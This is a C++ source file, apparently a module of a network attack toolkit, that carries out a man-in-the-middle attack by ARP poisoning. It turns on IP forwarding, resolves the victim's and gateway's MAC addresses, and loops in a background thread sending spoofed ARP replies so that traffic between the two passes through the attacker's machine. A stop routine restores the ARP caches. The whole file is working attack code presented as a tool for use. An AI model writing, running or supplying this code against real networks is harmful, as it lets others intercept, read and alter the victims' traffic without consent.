#include "Mitm.hh"

Mitm::Mitm(Core &core, std::ostream *out, const std::string &victimIp, const std::string &gatewayIp)
    : AModule(core, "Mitm", out), _run(false)
{
    _gateway.ip(IPv4Address(gatewayIp));
    _gateway.mac(_core.arpRequest(_gateway.ip()));

    _victim.ip(IPv4Address(victimIp));
    _victim.mac(_core.arpRequest(_victim.ip()));

    // Enable ip forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    *_out << "Start MITM : [" << _gateway.ip() << "] <---> [" << _victim.ip() << "]";
}

void Mitm::poison(void)
{
    // Start poisoning arp tables
    _run = true;
    while (_run)
    {
        // Tell gateway thats _victim.ip() is _attackerMac
        _core.arpReply(_victim.ip(), _core.mac(), _gateway.ip(), _gateway.mac());
        // Tell victim thats _gateway.ip() is _attackerMac
        _core.arpReply(_gateway.ip(), _core.mac(), _victim.ip(), _victim.mac());
        // Don't need to spam
        sleep(1);
    }
}

void Mitm::start(void)
{
    std::thread     t(&Mitm::poison, this);

    t.detach();
}

void Mitm::stop(void)
{
    _run = false;

    sleep(2);
    // Disable ip forward
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");

    // Restore arp cache
    for (int i = 0; i < 2; i++)
    {
        // Tell gateway thats _victim.ip() is _victim.mac()
        _core.arpReply(_victim.ip(), _victim.mac(), _gateway.ip(), _gateway.mac());
        // Tell victim thats _gateway.ip() is _gateway.mac()
        _core.arpReply(_gateway.ip(), _gateway.mac(), _victim.ip(), _victim.mac());
    }
}

std::string Mitm::info(void)
{
    std::stringstream   ss;

    ss << "Victim ip : " << _victim.ip() << " - Gateway ip : " << _gateway.ip();
    return ss.str();
}

std::string Mitm::help(void)
{
    std::string     rep;

    rep += "Start a man in the middle attack by arp poisoning.\n";
    rep += "\tOptions : <VictimIp> <GatewayIp>";
    return rep;
}
